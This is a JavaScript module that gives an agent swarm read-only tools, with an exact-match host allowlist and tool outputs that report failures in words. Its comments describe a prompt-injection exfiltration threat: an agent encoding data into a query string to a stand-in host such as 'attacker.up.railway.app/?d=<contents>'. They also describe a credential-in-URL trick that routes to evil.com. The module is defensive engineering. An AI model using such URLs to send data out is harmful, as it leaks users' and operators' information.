/**
 * swarm-toolbelt.js — the instruments the T12 swarm never had.
 *
 * ════════════════════════════════════════════════════════════════════════════════
 * WHY THIS EXISTS — and the note it corrects
 * ════════════════════════════════════════════════════════════════════════════════
 * The standing explanation for the swarm's fabrication problem was "T12 has no HTTP
 * client." That was wrong in a way that mattered, and it is worth stating plainly
 * because the wrong diagnosis made the fix look like a rewrite.
 *
 * The swarm has had a working tool-call loop the whole time: three iterations,
 * `tool_choice: 'auto'`, results fed back as `role:'tool'` messages, and a
 * hash-chained audit trail in `tool_call_logger.js`. All of it correct.
 *
 * It had exactly ONE tool: `save_artifact`.
 *
 * So an agent asked to measure something had no instrument, and the single
 * affordance available to it was to write prose into an artifact. 18 of 18 nightly
 * smoke reports contained zero real measurements. That is not fabrication by
 * disposition — it is fabrication BY CONSTRUCTION. A model asked for a number it
 * cannot obtain will produce a plausible number, every time, in any family.
 *
 * The loop was never the missing part. The tools were.
 *
 * ════════════════════════════════════════════════════════════════════════════════
 * THE RULE THAT GOVERNS EVERY TOOL IN HERE
 * ════════════════════════════════════════════════════════════════════════════════
 * **A failed tool MUST report its failure to the model in words.**
 *
 * This is the entire safety argument. If `http_get` fails and returns `''`, the
 * model sees an empty result, assumes nothing was there, and invents the content —
 * and we will have built a faster, better-instrumented fabrication machine and
 * fed its output into the ledger the whole system exists to make auditable.
 *
 * So every tool returns a string that either begins `OK` or begins `FAILED:` with
 * a reason. Never an empty string, never a silent default, never a stub. A tool
 * that cannot answer says so, and saying so is a successful outcome.
 *
 * ════════════════════════════════════════════════════════════════════════════════
 * READ-ONLY, DELIBERATELY
 * ════════════════════════════════════════════════════════════════════════════════
 * Every tool here reads. None writes. An agent that can write is an agent that can
 * poison the reputation ledger, and the swarm is the least-supervised tier we have.
 * The write path stays exactly where it is: `save_artifact`, which lands in a
 * reviewable artifact rather than in live state.
 *
 * Network egress is allowlisted, not open. `http_get` on an open internet from
 * twelve unattended agents is an exfiltration surface, and the value of arbitrary
 * browsing is far lower than the value of reaching OUR OWN endpoints — which is
 * what a smoke test, a health check, or a receipt verification actually needs.
 *
 * DEFAULT OFF. `SWARM_TOOLBELT=on` enables it. Twelve agents gaining new
 * capabilities simultaneously is exactly the kind of change that should be a
 * deliberate flip, observed, and reversible in one env change.
 */

const ENABLED = process.env.SWARM_TOOLBELT === 'on';

/**
 * Hosts a swarm agent may reach. EXACT match only — no wildcards.
 *
 * ════════════════════════════════════════════════════════════════════════════════
 * WHY THE WILDCARD IS GONE  [V by execution 2026-08-05, same day it merged]
 * ════════════════════════════════════════════════════════════════════════════════
 * The first version of this list contained `.up.railway.app` as a suffix entry.
 * That is a PUBLIC SUFFIX: anyone can open a free Railway account and deploy to
 * `<whatever>.up.railway.app`. So one entry intended to mean "our services" in
 * fact meant "any Railway customer's service, including one stood up specifically
 * to receive this traffic."
 *
 * That is not a theoretical concern for a read-only tool. `http_get` puts the URL
 * on the wire, so a prompt-injected agent could **exfiltrate** by encoding what it
 * knows into a query string — `https://attacker.up.railway.app/?d=<contents>` —
 * and could pull attacker-authored text straight into its own context. Read-only
 * limits what it can WRITE to our systems; it does nothing about what it can SEND.
 *
 * Suffix matching is therefore removed outright rather than patched. Every entry
 * is now a full hostname compared with `===`. Adding a service means adding a
 * line, which is a deliberate act — and the cost of that friction is much lower
 * than the cost of a wildcard whose blast radius depends on someone else's
 * customer signup page.
 *
 * (`SWARM_TOOLBELT_HOSTS` still overrides the list; entries are validated below so
 * an operator cannot silently reintroduce a wildcard.)
 */
const DEFAULT_HOSTS = [
  'repid-engine-production.up.railway.app',
  'api.hyperdag.org',
  'trustshell.dev',
  'hyperdag.org',
  'sepolia.basescan.org',
  'base-sepolia.blockscout.com',
];

const ALLOWED_HOSTS = (process.env.SWARM_TOOLBELT_HOSTS || DEFAULT_HOSTS.join(','))
  .split(',')
  .map((h) => h.trim().toLowerCase())
  .filter(Boolean)
  // A leading dot is the wildcard syntax that caused this. Refuse it loudly at
  // load rather than honour it — an operator adding `.up.railway.app` back to the
  // env var must find out immediately, not after an exfiltration.
  .filter((h) => {
    if (h.startsWith('.') || h.includes('*')) {
      console.error(
        `[swarm-toolbelt] REFUSING wildcard allowlist entry "${h}". ` +
        'Suffix entries admit every customer of a shared hosting domain. List full hostnames.',
      );
      return false;
    }
    return true;
  });

const MAX_BYTES = Number(process.env.SWARM_TOOLBELT_MAX_BYTES || 24_000);
const TIMEOUT_MS = Number(process.env.SWARM_TOOLBELT_TIMEOUT_MS || 15_000);

/**
 * Exact hostname match, after normalising the two forms that are the SAME host to
 * DNS but different strings to JavaScript: case, and the canonical trailing dot.
 *
 * Punycode and embedded credentials need no handling here because the caller
 * derives the hostname from `new URL()`, which already normalises IDN to punycode
 * and resolves `https://good.example@evil.com` to `evil.com` — verified, not
 * assumed. This function is nonetheless total on its input: it is exported and
 * tested directly, so it must not depend on its caller having done that.
 */
function hostAllowed(hostname) {
  const h = String(hostname || '').toLowerCase().replace(/\.+$/, '');
  return ALLOWED_HOSTS.includes(h);
}

/**
 * Truncate loudly. A silently-cut response is a response the model will reason
 * about as if it were complete.
 */
function clip(text) {
  const s = String(text ?? '');
  if (s.length <= MAX_BYTES) return s;
  return `${s.slice(0, MAX_BYTES)}\n\n[TRUNCATED at ${MAX_BYTES} bytes of ${s.length} — this response is INCOMPLETE, do not treat the tail as absent]`;
}

/**
 * The schemas handed to the provider. Descriptions are written FOR THE MODEL and
 * carry the anti-fabrication instruction, because the system prompt is far away by
 * the time a tool decision is made and the description is right there.
 */
const TOOL_SCHEMAS = [
  {
    type: 'function',
    function: {
      name: 'http_get',
      description:
        'Fetch a URL over HTTPS and return its status and body. Use this whenever a task asks ' +
        'you to CHECK, VERIFY, MEASURE or CONFIRM anything reachable over the network — never ' +
        'answer such a question from memory or inference. If this tool returns FAILED, report ' +
        'the failure; do NOT substitute a plausible value.',
      parameters: {
        type: 'object',
        properties: {
          url: { type: 'string', description: 'Full https:// URL. Only allowlisted hosts are reachable.' },
        },
        required: ['url'],
      },
    },
  },
  {
    type: 'function',
    function: {
      name: 'read_engine_stats',
      description:
        'Read the live public statistics of the RepID engine (settlements, RFQs, on-chain writes, ' +
        'proof counts). This is ground truth. Prefer it over any number you remember or were told.',
      parameters: { type: 'object', properties: {}, required: [] },
    },
  },
  {
    type: 'function',
    function: {
      name: 'report_unmeasurable',
      description:
        'Declare that a task asked for something you could NOT measure with the tools available. ' +
        'This is a SUCCESSFUL outcome, not a failure — it is strongly preferred over guessing. ' +
        'Call this instead of writing an artifact containing an invented number.',
      parameters: {
        type: 'object',
        properties: {
          what: { type: 'string', description: 'The specific quantity or fact you could not obtain.' },
          why: { type: 'string', description: 'What you tried and how it failed.' },
        },
        required: ['what', 'why'],
      },
    },
  },
];

/** Tool schemas to advertise, or [] when the belt is off. */
function toolSchemas() {
  return ENABLED ? TOOL_SCHEMAS : [];
}

function isToolbeltTool(name) {
  return TOOL_SCHEMAS.some((t) => t.function.name === name);
}

async function httpGet(rawUrl) {
  let url;
  try {
    url = new URL(String(rawUrl));
  } catch {
    return `FAILED: "${rawUrl}" is not a valid URL. Nothing was fetched.`;
  }
  if (url.protocol !== 'https:') {
    return `FAILED: refusing ${url.protocol}// — only https is permitted. Nothing was fetched.`;
  }
  if (!hostAllowed(url.hostname)) {
    return (
      `FAILED: host "${url.hostname}" is not on the swarm allowlist, so nothing was fetched. ` +
      `Reachable hosts: ${ALLOWED_HOSTS.join(', ')}. ` +
      `Do NOT infer what this URL would have returned — report that you could not reach it.`
    );
  }

  const ctl = new AbortController();
  const timer = setTimeout(() => ctl.abort(), TIMEOUT_MS);
  try {
    const res = await fetch(url.toString(), {
      method: 'GET',
      signal: ctl.signal,
      headers: { accept: 'application/json, text/plain;q=0.9, */*;q=0.5', 'user-agent': 'hyperdag-swarm-toolbelt/1' },
    });
    const body = clip(await res.text());
    // A non-2xx is REPORTED, not thrown away. "The endpoint returned 502" is a
    // real and often the most valuable measurement a smoke task can produce.
    return `OK status=${res.status} ${res.statusText}\nurl=${url.toString()}\n---\n${body}`;
  } catch (e) {
    const msg = e && e.name === 'AbortError' ? `timed out after ${TIMEOUT_MS}ms` : String((e && e.message) || e);
    return (
      `FAILED: request to ${url.toString()} did not complete — ${msg}. ` +
      `No data was received. Report this failure; do not estimate what the response would have been.`
    );
  } finally {
    clearTimeout(timer);
  }
}

/**
 * Execute one toolbelt call. Returns the string handed back to the model.
 *
 * Never throws: an exception here would abort the agent's loop and lose the task,
 * whereas a `FAILED:` string keeps the agent running and tells it the truth. The
 * catch-all is deliberate and is the only blanket catch in this file.
 */
async function execute(name, args) {
  if (!ENABLED) return `FAILED: the swarm toolbelt is disabled (SWARM_TOOLBELT is not 'on').`;
  try {
    switch (name) {
      case 'http_get':
        return await httpGet(args && args.url);
      case 'read_engine_stats': {
        const base = process.env.REPID_ENGINE_URL || 'https://repid-engine-production.up.railway.app';
        return await httpGet(`${base.replace(/\/+$/, '')}/api/v1/stats`);
      }
      case 'report_unmeasurable': {
        const what = String((args && args.what) || '(unspecified)');
        const why = String((args && args.why) || '(unspecified)');
        // Echoed back so it lands in the transcript AND the tool_call_log, which
        // is what turns "the agent admitted it could not measure this" into a
        // queryable fact rather than a sentence buried in prose.
        return `OK recorded_unmeasurable what="${what}" why="${why}". This is an acceptable outcome — do not now guess the value.`;
      }
      default:
        return `FAILED: no such tool "${name}".`;
    }
  } catch (e) {
    return `FAILED: tool "${name}" threw — ${String((e && e.message) || e)}. No result was obtained.`;
  }
}

module.exports = {
  toolSchemas,
  isToolbeltTool,
  execute,
  // exported for tests
  hostAllowed,
  clip,
  ENABLED,
  ALLOWED_HOSTS,
};
